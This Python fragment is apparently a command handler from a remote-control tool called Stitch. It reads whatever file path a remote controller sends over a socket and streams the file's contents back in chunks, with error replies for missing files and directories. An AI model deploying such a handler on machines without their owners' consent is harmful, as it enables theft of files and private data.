# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os

read_file = receive(client_socket)
if os.path.exists(read_file):
    if os.path.isfile(read_file):
        try:
            with open (read_file,'rb') as n:
                send(client_socket,'SUCCESS')
                line = n.read(1024)
                while line:
                    send(client_socket,line)
                    line=n.read(1024)
                send(client_socket, st_complete)
        except Exception as e:
            err = '[!] {}'.format(str(e))
            send(client_socket,err)
    else:
        err = "ERROR: {}/: Is a directory\n".format(read_file)
        send(client_socket, err)
else:
    err = "ERROR: {}: No such file or directory\n".format(read_file)
    send(client_socket,err)
